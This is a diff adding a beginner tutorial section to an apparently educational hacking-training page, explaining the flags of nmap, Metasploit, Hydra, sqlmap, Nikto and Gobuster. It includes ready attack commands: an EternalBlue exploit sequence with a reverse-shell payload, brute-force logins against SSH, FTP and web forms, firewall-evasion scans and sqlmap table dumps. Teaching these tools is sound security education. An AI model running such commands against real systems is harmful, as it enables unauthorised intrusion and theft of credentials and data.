@@ -79,6 +79,495 @@
                     </ul>
                 </div>
 
+                <!-- BRAND NEW SECTION: COMMAND ANATOMY - Understanding EVERY Part of Linux Commands -->
+                <div class="topic-section" style="background: linear-gradient(135deg, rgba(255,64,129,0.08) 0%, rgba(103,58,183,0.08) 100%); padding: 4rem; border-radius: 20px; margin: 4rem 0; border: 3px solid rgba(255,64,129,0.3);">
+                    <h2 style="color: #ff4081; font-size: 2.8rem; margin-bottom: 2rem; text-align: center;">📖 COMMAND ANATOMY: How to Read Linux Commands Like a Pro</h2>
+                    
+                    <div style="background: rgba(255,193,7,0.2); padding: 2.5rem; border-radius: 15px; margin: 2rem 0; border-left: 5px solid #ffc107;">
+                        <p style="margin: 0; font-size: 1.3rem; line-height: 2; color: #fff;">
+                            <strong>THIS IS THE MOST IMPORTANT SECTION!</strong> Linux commands look scary because they have weird flags like <code>-sS</code>, <code>-A</code>, <code>-p</code>. 
+                            This section explains EVERY character, EVERY flag, EVERY symbol you'll see. After this, commands will make PERFECT sense.
+                        </p>
+                    </div>
+
+                    <!-- Part 1: Basic Command Structure -->
+                    <div style="background: rgba(0,0,0,0.5); padding: 3rem; border-radius: 15px; margin: 3rem 0;">
+                        <h3 style="color: #00ff88; font-size: 2.2rem; margin-bottom: 2rem;">Part 1: Basic Command Structure</h3>
+                        
+                        <div style="background: rgba(33,150,243,0.15); padding: 2.5rem; border-radius: 12px; margin: 2rem 0;">
+                            <h4 style="color: #2196f3; font-size: 1.8rem; margin: 0 0 1.5rem 0;">The Anatomy of ANY Command:</h4>
+                            <div style="background: #000; padding: 2rem; border-radius: 10px; font-family: monospace; font-size: 1.2rem; margin: 1.5rem 0;">
+                                <p style="color: #0f0; margin: 0;"><span style="color: #ff4081;">command</span> <span style="color: #ffc107;">-flags</span> <span style="color: #00ccff;">--long-options</span> <span style="color: #c7f;">arguments</span></p>
+                            </div>
+                            
+                            <div style="display: grid; gap: 2rem; margin-top: 2rem;">
+                                <div style="background: rgba(255,64,129,0.1); padding: 2rem; border-radius: 10px;">
+                                    <h5 style="color: #ff4081; font-size: 1.4rem; margin: 0 0 1rem 0;">1. Command (The Action)</h5>
+                                    <p style="font-size: 1.1rem; line-height: 1.9;">
+                                        The <strong>command</strong> is the program you want to run. Examples: <code>ls</code> (list files), <code>grep</code> (search), <code>nmap</code> (scan network).
+                                    </p>
+                                    <div style="background: #000; padding: 1.5rem; border-radius: 8px; margin-top: 1rem; font-family: monospace;">
+                                        <p style="color: #f48; margin: 0;">ls  <span style="color: #888;">← This is the command</span></p>
+                                    </div>
+                                </div>
+
+                                <div style="background: rgba(255,193,7,0.1); padding: 2rem; border-radius: 10px;">
+                                    <h5 style="color: #ffc107; font-size: 1.4rem; margin: 0 0 1rem 0;">2. Flags/Options (How to Do It)</h5>
+                                    <p style="font-size: 1.1rem; line-height: 1.9;">
+                                        <strong>Flags</strong> modify how the command behaves. They start with <code>-</code> (single dash) for short options or <code>--</code> (double dash) for long options.
+                                    </p>
+                                    <div style="background: #000; padding: 1.5rem; border-radius: 8px; margin-top: 1rem; font-family: monospace;">
+                                        <p style="color: #fc0; margin: 0;">ls <span style="color: #fc0;">-l</span>  <span style="color: #888;">← Short flag (one letter)</span></p>
+                                        <p style="color: #fc0; margin: 0.5rem 0 0;">ls <span style="color: #fc0;">--all</span>  <span style="color: #888;">← Long flag (full word)</span></p>
+                                    </div>
+                                </div>
+
+                                <div style="background: rgba(0,204,255,0.1); padding: 2rem; border-radius: 10px;">
+                                    <h5 style="color: #00ccff; font-size: 1.4rem; margin: 0 0 1rem 0;">3. Arguments (What to Act On)</h5>
+                                    <p style="font-size: 1.1rem; line-height: 1.9;">
+                                        <strong>Arguments</strong> are the targets - files, directories, IP addresses, etc. What the command should work on.
+                                    </p>
+                                    <div style="background: #000; padding: 1.5rem; border-radius: 8px; margin-top: 1rem; font-family: monospace;">
+                                        <p style="color: #0cf; margin: 0;">cat <span style="color: #c7f;">file.txt</span>  <span style="color: #888;">← file.txt is the argument</span></p>
+                                        <p style="color: #0cf; margin: 0.5rem 0 0;">nmap <span style="color: #c7f;">192.168.1.1</span>  <span style="color: #888;">← IP address is the argument</span></p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Example Breakdown -->
+                        <div style="background: rgba(76,175,80,0.15); padding: 3rem; border-radius: 12px; margin: 3rem 0; border: 2px solid #4caf50;">
+                            <h4 style="color: #4caf50; font-size: 2rem; margin: 0 0 2rem 0;">🔬 Full Command Dissection Example:</h4>
+                            
+                            <div style="background: #000; padding: 2rem; border-radius: 10px; font-family: monospace; font-size: 1.3rem; margin: 2rem 0;">
+                                <p style="color: #fff; margin: 0;"><span style="color: #ff4081;">nmap</span> <span style="color: #ffc107;">-sS</span> <span style="color: #ffc107;">-A</span> <span style="color: #ffc107;">-p</span> <span style="color: #c7f;">80,443</span> <span style="color: #c7f;">192.168.1.1</span></p>
+                            </div>
+
+                            <div style="display: grid; gap: 1.5rem; margin-top: 2rem;">
+                                <div style="background: rgba(255,64,129,0.2); padding: 1.5rem; border-radius: 8px;">
+                                    <p style="margin: 0; font-size: 1.15rem;"><strong style="color: #ff4081;">nmap</strong> = The command (network mapper tool for scanning)</p>
+                                </div>
+                                <div style="background: rgba(255,193,7,0.2); padding: 1.5rem; border-radius: 8px;">
+                                    <p style="margin: 0; font-size: 1.15rem;"><strong style="color: #ffc107;">-sS</strong> = Flag meaning "SYN scan" (stealth scan, doesn't complete TCP handshake)</p>
+                                </div>
+                                <div style="background: rgba(255,193,7,0.2); padding: 1.5rem; border-radius: 8px;">
+                                    <p style="margin: 0; font-size: 1.15rem;"><strong style="color: #ffc107;">-A</strong> = Flag meaning "aggressive" (OS detection + version detection + scripts)</p>
+                                </div>
+                                <div style="background: rgba(255,193,7,0.2); padding: 1.5rem; border-radius: 8px;">
+                                    <p style="margin: 0; font-size: 1.15rem;"><strong style="color: #ffc107;">-p</strong> = Flag meaning "ports" (which ports to scan)</p>
+                                </div>
+                                <div style="background: rgba(199,119,255,0.2); padding: 1.5rem; border-radius: 8px;">
+                                    <p style="margin: 0; font-size: 1.15rem;"><strong style="color: #c7f;">80,443</strong> = Argument for -p flag (scan ports 80 and 443)</p>
+                                </div>
+                                <div style="background: rgba(199,119,255,0.2); padding: 1.5rem; border-radius: 8px;">
+                                    <p style="margin: 0; font-size: 1.15rem;"><strong style="color: #c7f;">192.168.1.1</strong> = Final argument (the target IP address to scan)</p>
+                                </div>
+                            </div>
+
+                            <div style="background: rgba(0,255,136,0.15); padding: 2rem; border-radius: 10px; margin-top: 2rem;">
+                                <p style="margin: 0; font-size: 1.2rem; line-height: 1.9; color: #fff;">
+                                    <strong style="color: #00ff88;">Translation:</strong> "Hey nmap, do a stealth SYN scan with aggressive options, check ports 80 and 443 on the machine at 192.168.1.1"
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Part 2: Common Flags Encyclopedia -->
+                    <div style="background: rgba(0,0,0,0.5); padding: 3rem; border-radius: 15px; margin: 3rem 0;">
+                        <h3 style="color: #ff4081; font-size: 2.2rem; margin-bottom: 2rem;">Part 2: Common Flags You'll See EVERYWHERE</h3>
+
+                        <div style="display: grid; gap: 2rem;">
+                            <!-- Nmap Flags -->
+                            <div style="background: linear-gradient(135deg, rgba(255,64,129,0.1) 0%, rgba(156,39,176,0.1) 100%); padding: 2.5rem; border-radius: 12px; border: 2px solid rgba(255,64,129,0.4);">
+                                <h4 style="color: #ff4081; font-size: 1.8rem; margin: 0 0 1.5rem 0;">🔍 NMAP Flags (Network Scanning)</h4>
+                                
+                                <div style="display: grid; gap: 1.5rem;">
+                                    <div style="background: rgba(0,0,0,0.4); padding: 1.5rem; border-radius: 8px;">
+                                        <h5 style="color: #ffc107; font-size: 1.3rem; margin: 0 0 0.8rem 0;">Scan Types:</h5>
+                                        <ul style="font-size: 1.1rem; line-height: 2; margin: 0;">
+                                            <li><code style="color: #00ff88;">-sS</code> = <strong>SYN scan</strong> (stealth, half-open scan - most common)</li>
+                                            <li><code style="color: #00ff88;">-sT</code> = <strong>TCP Connect scan</strong> (full connection, noisier)</li>
+                                            <li><code style="color: #00ff88;">-sU</code> = <strong>UDP scan</strong> (scan UDP ports instead of TCP)</li>
+                                            <li><code style="color: #00ff88;">-sn</code> = <strong>Ping scan</strong> (just check if host is up, no port scan)</li>
+                                            <li><code style="color: #00ff88;">-sV</code> = <strong>Version detection</strong> (detect service versions running)</li>
+                                        </ul>
+                                    </div>
+
+                                    <div style="background: rgba(0,0,0,0.4); padding: 1.5rem; border-radius: 8px;">
+                                        <h5 style="color: #ffc107; font-size: 1.3rem; margin: 0 0 0.8rem 0;">Detection Options:</h5>
+                                        <ul style="font-size: 1.1rem; line-height: 2; margin: 0;">
+                                            <li><code style="color: #00ff88;">-O</code> = <strong>OS detection</strong> (guess what operating system)</li>
+                                            <li><code style="color: #00ff88;">-A</code> = <strong>Aggressive</strong> (OS + version + scripts + traceroute)</li>
+                                            <li><code style="color: #00ff88;">--script</code> = <strong>NSE scripts</strong> (run specific Nmap scripts)</li>
+                                        </ul>
+                                    </div>
+
+                                    <div style="background: rgba(0,0,0,0.4); padding: 1.5rem; border-radius: 8px;">
+                                        <h5 style="color: #ffc107; font-size: 1.3rem; margin: 0 0 0.8rem 0;">Port Specifications:</h5>
+                                        <ul style="font-size: 1.1rem; line-height: 2; margin: 0;">
+                                            <li><code style="color: #00ff88;">-p 80</code> = Scan only port 80</li>
+                                            <li><code style="color: #00ff88;">-p 80,443,8080</code> = Scan specific ports (comma-separated)</li>
+                                            <li><code style="color: #00ff88;">-p 1-1000</code> = Scan range of ports</li>
+                                            <li><code style="color: #00ff88;">-p-</code> = Scan ALL 65535 ports (takes forever!)</li>
+                                            <li><code style="color: #00ff88;">--top-ports 100</code> = Scan most common 100 ports</li>
+                                        </ul>
+                                    </div>
+
+                                    <div style="background: rgba(0,0,0,0.4); padding: 1.5rem; border-radius: 8px;">
+                                        <h5 style="color: #ffc107; font-size: 1.3rem; margin: 0 0 0.8rem 0;">Timing & Stealth:</h5>
+                                        <ul style="font-size: 1.1rem; line-height: 2; margin: 0;">
+                                            <li><code style="color: #00ff88;">-T0</code> to <code>-T5</code> = <strong>Timing templates</strong> (0=slowest/stealthiest, 5=fastest/loudest)</li>
+                                            <li><code style="color: #00ff88;">-f</code> = <strong>Fragment packets</strong> (evade firewalls)</li>
+                                            <li><code style="color: #00ff88;">-D</code> = <strong>Decoy scan</strong> (make it look like multiple IPs scanning)</li>
+                                        </ul>
+                                    </div>
+
+                                    <div style="background: #000; padding: 2rem; border-radius: 10px; margin-top: 1rem; font-family: monospace;">
+                                        <p style="color: #888; margin-bottom: 0.5rem;"># Stealthy scan (slow but quiet)</p>
+                                        <p style="color: #f48;">nmap -sS -T2 --top-ports 20 target.com</p>
+                                        
+                                        <p style="color: #888; margin: 1.5rem 0 0.5rem;"># Aggressive full scan (fast, get everything)</p>
+                                        <p style="color: #f48;">nmap -sS -sV -O -A -p- target.com</p>
+                                        
+                                        <p style="color: #888; margin: 1.5rem 0 0.5rem;"># Quick common ports scan</p>
+                                        <p style="color: #f48;">nmap -sS -T4 -F target.com</p>
+                                        
+                                        <p style="color: #888; margin: 1.5rem 0 0.5rem;"># Vulnerability scan with scripts</p>
+                                        <p style="color: #f48;">nmap --script vuln -p 80,443 target.com</p>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Metasploit Commands -->
+                            <div style="background: linear-gradient(135deg, rgba(156,39,176,0.1) 0%, rgba(103,58,183,0.1) 100%); padding: 2.5rem; border-radius: 12px; border: 2px solid rgba(156,39,176,0.4);">
+                                <h4 style="color: #9c27b0; font-size: 1.8rem; margin: 0 0 1.5rem 0;">💣 METASPLOIT Commands (Exploitation)</h4>
+                                
+                                <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px;">
+                                    <h5 style="color: #ffc107; font-size: 1.3rem; margin: 0 0 1rem 0;">Inside msfconsole:</h5>
+                                    <div style="font-size: 1.1rem; line-height: 2.2;">
+                                        <p style="margin: 0.5rem 0;"><code style="color: #c7f;">search</code> [term] = <strong>Find exploits/modules</strong> (e.g., <code>search ms17-010</code>)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #c7f;">use</code> [module] = <strong>Select exploit</strong> (e.g., <code>use exploit/windows/smb/ms17_010</code>)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #c7f;">show options</code> = <strong>View required settings</strong></p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #c7f;">set</code> [option] [value] = <strong>Configure exploit</strong> (e.g., <code>set RHOSTS 192.168.1.10</code>)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #c7f;">setg</code> [option] [value] = <strong>Set globally</strong> (applies to all modules)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #c7f;">show payloads</code> = <strong>List available payloads</strong> (what to run after exploit)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #c7f;">set PAYLOAD</code> [payload] = <strong>Choose payload</strong> (e.g., <code>set PAYLOAD windows/meterpreter/reverse_tcp</code>)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #c7f;">exploit</code> or <code>run</code> = <strong>Launch attack</strong></p>
+                                    </div>
+
+                                    <div style="background: #000; padding: 2rem; border-radius: 10px; margin-top: 2rem; font-family: monospace;">
+                                        <p style="color: #888; margin-bottom: 0.5rem;"># Complete exploit sequence</p>
+                                        <p style="color: #c7f;">search eternal</p>
+                                        <p style="color: #c7f;">use exploit/windows/smb/ms17_010_eternalblue</p>
+                                        <p style="color: #c7f;">show options</p>
+                                        <p style="color: #c7f;">set RHOSTS 10.10.10.40</p>
+                                        <p style="color: #c7f;">set LHOST 10.10.14.5</p>
+                                        <p style="color: #c7f;">set PAYLOAD windows/x64/meterpreter/reverse_tcp</p>
+                                        <p style="color: #c7f;">exploit</p>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Hydra Flags -->
+                            <div style="background: linear-gradient(135deg, rgba(244,67,54,0.1) 0%, rgba(233,30,99,0.1) 100%); padding: 2.5rem; border-radius: 12px; border: 2px solid rgba(244,67,54,0.4);">
+                                <h4 style="color: #f44336; font-size: 1.8rem; margin: 0 0 1.5rem 0;">🔐 HYDRA Flags (Brute Force)</h4>
+                                
+                                <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px;">
+                                    <h5 style="color: #ffc107; font-size: 1.3rem; margin: 0 0 1rem 0;">Username & Password Options:</h5>
+                                    <div style="font-size: 1.1rem; line-height: 2.2;">
+                                        <p style="margin: 0.5rem 0;"><code style="color: #ff5252;">-l</code> [username] = <strong>Single username</strong> (e.g., <code>-l admin</code>)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #ff5252;">-L</code> [file] = <strong>Username list</strong> (e.g., <code>-L users.txt</code>)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #ff5252;">-p</code> [password] = <strong>Single password</strong> (e.g., <code>-p password123</code>)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #ff5252;">-P</code> [file] = <strong>Password list</strong> (e.g., <code>-P rockyou.txt</code>)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #ff5252;">-C</code> [file] = <strong>Colon-separated file</strong> (username:password format)</p>
+                                    </div>
+
+                                    <h5 style="color: #ffc107; font-size: 1.3rem; margin: 2rem 0 1rem 0;">Performance & Output:</h5>
+                                    <div style="font-size: 1.1rem; line-height: 2.2;">
+                                        <p style="margin: 0.5rem 0;"><code style="color: #ff5252;">-t</code> [threads] = <strong>Number of parallel tasks</strong> (e.g., <code>-t 16</code> = 16 threads)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #ff5252;">-V</code> = <strong>Verbose</strong> (show each attempt)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #ff5252;">-f</code> = <strong>Stop after first valid</strong> (quit when found)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #ff5252;">-s</code> [port] = <strong>Custom port</strong> (if not default)</p>
+                                    </div>
+
+                                    <div style="background: #000; padding: 2rem; border-radius: 10px; margin-top: 2rem; font-family: monospace;">
+                                        <p style="color: #888; margin-bottom: 0.5rem;"># Brute force SSH</p>
+                                        <p style="color: #f66;">hydra -l admin -P passwords.txt ssh://192.168.1.10</p>
+                                        
+                                        <p style="color: #888; margin: 1.5rem 0 0.5rem;"># Brute force FTP (faster with threads)</p>
+                                        <p style="color: #f66;">hydra -L users.txt -P pass.txt -t 16 ftp://10.10.10.5</p>
+                                        
+                                        <p style="color: #888; margin: 1.5rem 0 0.5rem;"># HTTP POST form brute force</p>
+                                        <p style="color: #f66;">hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form \"/login:user=^USER^&pass=^PASS^:Invalid\"</p>
+                                        
+                                        <p style="color: #888; margin: 1.5rem 0 0.5rem;"># Verbose mode (see all attempts)</p>
+                                        <p style="color: #f66;">hydra -l root -P rockyou.txt -V -f ssh://target.com</p>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- SQLMap Flags -->
+                            <div style="background: linear-gradient(135deg, rgba(255,152,0,0.1) 0%, rgba(255,193,7,0.1) 100%); padding: 2.5rem; border-radius: 12px; border: 2px solid rgba(255,152,0,0.4);">
+                                <h4 style="color: #ff9800; font-size: 1.8rem; margin: 0 0 1.5rem 0;">💉 SQLMAP Flags (SQL Injection)</h4>
+                                
+                                <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px;">
+                                    <h5 style="color: #ffc107; font-size: 1.3rem; margin: 0 0 1rem 0;">Target Options:</h5>
+                                    <div style="font-size: 1.1rem; line-height: 2.2;">
+                                        <p style="margin: 0.5rem 0;"><code style="color: #ff9800;">-u</code> [URL] = <strong>Target URL</strong> (e.g., <code>-u \"http://site.com/page?id=1\"</code>)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #ff9800;">-r</code> [file] = <strong>Load HTTP request from file</strong> (Burp Suite saved request)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #ff9800;">--data</code> [string] = <strong>POST data</strong> (for POST requests)</p>
+                                    </div>
+
+                                    <h5 style="color: #ffc107; font-size: 1.3rem; margin: 2rem 0 1rem 0;">Enumeration:</h5>
+                                    <div style="font-size: 1.1rem; line-height: 2.2;">
+                                        <p style="margin: 0.5rem 0;"><code style="color: #ff9800;">--dbs</code> = <strong>List all databases</strong></p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #ff9800;">-D</code> [database] = <strong>Specify database</strong> (e.g., <code>-D webapp_db</code>)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #ff9800;">--tables</code> = <strong>List tables</strong> (use with -D)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #ff9800;">-T</code> [table] = <strong>Specify table</strong> (e.g., <code>-T users</code>)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #ff9800;">--columns</code> = <strong>List columns</strong> (use with -T)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #ff9800;">--dump</code> = <strong>Extract data</strong> (dump table contents)</p>
+                                    </div>
+
+                                    <h5 style="color: #ffc107; font-size: 1.3rem; margin: 2rem 0 1rem 0;">Convenience:</h5>
+                                    <div style="font-size: 1.1rem; line-height: 2.2;">
+                                        <p style="margin: 0.5rem 0;"><code style="color: #ff9800;">--batch</code> = <strong>Auto-answer prompts</strong> (never ask for input)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #ff9800;">--random-agent</code> = <strong>Random User-Agent</strong> (avoid detection)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #ff9800;">--threads</code> [n] = <strong>Speed up with threads</strong></p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #ff9800;">--level</code> [1-5] = <strong>Test thoroughness</strong> (5 = most thorough)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #ff9800;">--risk</code> [1-3] = <strong>Risk level</strong> (3 = aggressive, may damage DB)</p>
+                                    </div>
+
+                                    <div style="background: #000; padding: 2rem; border-radius: 10px; margin-top: 2rem; font-family: monospace;">
+                                        <p style="color: #888; margin-bottom: 0.5rem;"># Basic injection test</p>
+                                        <p style="color: #f90;">sqlmap -u \"http://site.com/page?id=1\"</p>
+                                        
+                                        <p style="color: #888; margin: 1.5rem 0 0.5rem;"># List databases</p>
+                                        <p style="color: #f90;">sqlmap -u \"http://site.com/page?id=1\" --dbs --batch</p>
+                                        
+                                        <p style="color: #888; margin: 1.5rem 0 0.5rem;"># Dump specific table</p>
+                                        <p style="color: #f90;">sqlmap -u \"http://site.com/page?id=1\" -D webapp_db -T users --dump</p>
+                                        
+                                        <p style="color: #888; margin: 1.5rem 0 0.5rem;"># Aggressive scan</p>
+                                        <p style="color: #f90;">sqlmap -u \"target.com\" --level=5 --risk=3 --batch --random-agent</p>
+                                        
+                                        <p style="color: #888; margin: 1.5rem 0 0.5rem;"># POST request with data</p>
+                                        <p style="color: #f90;">sqlmap -u \"http://site.com/login\" --data=\"user=admin&pass=test\" -p user</p>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Nikto Flags -->
+                            <div style="background: linear-gradient(135deg, rgba(33,150,243,0.1) 0%, rgba(0,188,212,0.1) 100%); padding: 2.5rem; border-radius: 12px; border: 2px solid rgba(33,150,243,0.4);">
+                                <h4 style="color: #2196f3; font-size: 1.8rem; margin: 0 0 1.5rem 0;">🔎 NIKTO Flags (Web Server Scanner)</h4>
+                                
+                                <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px;">
+                                    <div style="font-size: 1.1rem; line-height: 2.2;">
+                                        <p style="margin: 0.5rem 0;"><code style="color: #29f;">-h</code> [host] = <strong>Target host</strong> (e.g., <code>-h http://target.com</code>)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #29f;">-p</code> [ports] = <strong>Ports to scan</strong> (e.g., <code>-p 80,443,8080</code>)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #29f;">-ssl</code> = <strong>Force SSL/HTTPS</strong></p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #29f;">-Tuning</code> [options] = <strong>Scan categories</strong> (1=interesting files, 2=misconfig, 3=info disclosure, etc.)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #29f;">-o</code> [file] = <strong>Output to file</strong> (e.g., <code>-o results.txt</code>)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #29f;">-Format</code> [format] = <strong>Output format</strong> (txt, html, csv, xml)</p>
+                                    </div>
+
+                                    <div style="background: #000; padding: 2rem; border-radius: 10px; margin-top: 2rem; font-family: monospace;">
+                                        <p style="color: #888; margin-bottom: 0.5rem;"># Basic scan</p>
+                                        <p style="color: #29f;">nikto -h http://target.com</p>
+                                        
+                                        <p style="color: #888; margin: 1.5rem 0 0.5rem;"># HTTPS scan on port 443</p>
+                                        <p style="color: #29f;">nikto -h target.com -p 443 -ssl</p>
+                                        
+                                        <p style="color: #888; margin: 1.5rem 0 0.5rem;"># Multiple ports</p>
+                                        <p style="color: #29f;">nikto -h 192.168.1.10 -p 80,443,8080</p>
+                                        
+                                        <p style="color: #888; margin: 1.5rem 0 0.5rem;"># Save results</p>
+                                        <p style="color: #29f;">nikto -h target.com -o scan_results.txt -Format txt</p>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Gobuster Flags -->
+                            <div style="background: linear-gradient(135deg, rgba(76,175,80,0.1) 0%, rgba(139,195,74,0.1) 100%); padding: 2.5rem; border-radius: 12px; border: 2px solid rgba(76,175,80,0.4);">
+                                <h4 style="color: #4caf50; font-size: 1.8rem; margin: 0 0 1.5rem 0;">📂 GOBUSTER Flags (Directory/DNS Brute Force)</h4>
+                                
+                                <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px;">
+                                    <h5 style="color: #ffc107; font-size: 1.3rem; margin: 0 0 1rem 0;">Modes:</h5>
+                                    <div style="font-size: 1.1rem; line-height: 2.2;">
+                                        <p style="margin: 0.5rem 0;"><code style="color: #4caf50;">dir</code> = <strong>Directory/file brute force mode</strong></p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #4caf50;">dns</code> = <strong>DNS subdomain brute force mode</strong></p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #4caf50;">vhost</code> = <strong>Virtual host brute force mode</strong></p>
+                                    </div>
+
+                                    <h5 style="color: #ffc107; font-size: 1.3rem; margin: 2rem 0 1rem 0;">Directory Mode Flags:</h5>
+                                    <div style="font-size: 1.1rem; line-height: 2.2;">
+                                        <p style="margin: 0.5rem 0;"><code style="color: #4caf50;">-u</code> [url] = <strong>Target URL</strong> (e.g., <code>-u http://site.com</code>)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #4caf50;">-w</code> [wordlist] = <strong>Wordlist file</strong> (e.g., <code>-w /usr/share/wordlists/dirb/common.txt</code>)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #4caf50;">-x</code> [extensions] = <strong>File extensions</strong> (e.g., <code>-x php,txt,html</code>)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #4caf50;">-t</code> [threads] = <strong>Number of threads</strong> (e.g., <code>-t 50</code>)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #4caf50;">-s</code> [codes] = <strong>Status codes to show</strong> (e.g., <code>-s 200,301,302</code>)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #4caf50;">-k</code> = <strong>Skip SSL certificate verification</strong></p>
+                                    </div>
+
+                                    <h5 style="color: #ffc107; font-size: 1.3rem; margin: 2rem 0 1rem 0;">DNS Mode Flags:</h5>
+                                    <div style="font-size: 1.1rem; line-height: 2.2;">
+                                        <p style="margin: 0.5rem 0;"><code style="color: #4caf50;">-d</code> [domain] = <strong>Target domain</strong> (e.g., <code>-d example.com</code>)</p>
+                                        <p style="margin: 0.5rem 0;"><code style="color: #4caf50;">-w</code> [wordlist] = <strong>Subdomain wordlist</strong></p>
+                                    </div>
+
+                                    <div style="background: #000; padding: 2rem; border-radius: 10px; margin-top: 2rem; font-family: monospace;">
+                                        <p style="color: #888; margin-bottom: 0.5rem;"># Basic directory brute force</p>
+                                        <p style="color: #4caf50;">gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt</p>
+                                        
+                                        <p style="color: #888; margin: 1.5rem 0 0.5rem;"># With file extensions</p>
+                                        <p style="color: #4caf50;">gobuster dir -u http://target.com -w wordlist.txt -x php,txt,html</p>
+                                        
+                                        <p style="color: #888; margin: 1.5rem 0 0.5rem;"># Fast scan with 50 threads</p>
+                                        <p style="color: #4caf50;">gobuster dir -u http://target.com -w wordlist.txt -t 50</p>
+                                        
+                                        <p style="color: #888; margin: 1.5rem 0 0.5rem;"># DNS subdomain enumeration</p>
+                                        <p style="color: #4caf50;">gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</p>
+                                        
+                                        <p style="color: #888; margin: 1.5rem 0 0.5rem;"># Show only 200 & 301 responses</p>
+                                        <p style="color: #4caf50;">gobuster dir -u http://target.com -w wordlist.txt -s 200,301</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Part 3: Special Characters & Operators -->
+                    <div style="background: rgba(0,0,0,0.5); padding: 3rem; border-radius: 15px; margin: 3rem 0;">
+                        <h3 style="color: #00ccff; font-size: 2.2rem; margin-bottom: 2rem;">Part 3: Special Characters & Operators</h3>
+
+                        <div style="display: grid; gap: 2rem;">
+                            <div style="background: rgba(0,204,255,0.1); padding: 2rem; border-radius: 10px; border-left: 4px solid #00ccff;">
+                                <h4 style="color: #00ccff; font-size: 1.6rem; margin: 0 0 1.5rem 0;">Pipes & Redirection:</h4>
+                                <div style="font-size: 1.15rem; line-height: 2.2;">
+                                    <p style="margin: 0.8rem 0;"><code style="color: #00ff88; font-size: 1.3rem;">|</code> (pipe) = <strong>Send output of one command to another</strong></p>
+                                    <p style="margin-left: 2rem; color: #aaa;">Example: <code>cat file.txt | grep "password"</code> → read file, then search for "password"</p>
+                                    
+                                    <p style="margin: 1.5rem 0 0.8rem;"><code style="color: #00ff88; font-size: 1.3rem;">&gt;</code> (redirect) = <strong>Write output to file (overwrite)</strong></p>
+                                    <p style="margin-left: 2rem; color: #aaa;">Example: <code>echo "hello" > file.txt</code> → writes "hello" to file (destroys old content)</p>
+                                    
+                                    <p style="margin: 1.5rem 0 0.8rem;"><code style="color: #00ff88; font-size: 1.3rem;">&gt;&gt;</code> (append) = <strong>Add output to end of file</strong></p>
+                                    <p style="margin-left: 2rem; color: #aaa;">Example: <code>echo "line" >> file.txt</code> → adds new line to end (keeps old content)</p>
+                                    
+                                    <p style="margin: 1.5rem 0 0.8rem;"><code style="color: #00ff88; font-size: 1.3rem;">&lt;</code> (input redirect) = <strong>Read input from file</strong></p>
+                                    <p style="margin-left: 2rem; color: #aaa;">Example: <code>wc -l < file.txt</code> → count lines in file</p>
+                                    
+                                    <p style="margin: 1.5rem 0 0.8rem;"><code style="color: #00ff88; font-size: 1.3rem;">2&gt;</code> (error redirect) = <strong>Redirect errors to file</strong></p>
+                                    <p style="margin-left: 2rem; color: #aaa;">Example: <code>find / -name "*.txt" 2> errors.log</code> → save errors to log</p>
+                                    
+                                    <p style="margin: 1.5rem 0 0.8rem;"><code style="color: #00ff88; font-size: 1.3rem;">2&gt;&amp;1</code> = <strong>Redirect errors to same place as output</strong></p>
+                                    <p style="margin-left: 2rem; color: #aaa;">Example: <code>command > output.log 2>&1</code> → save everything to one file</p>
+                                    
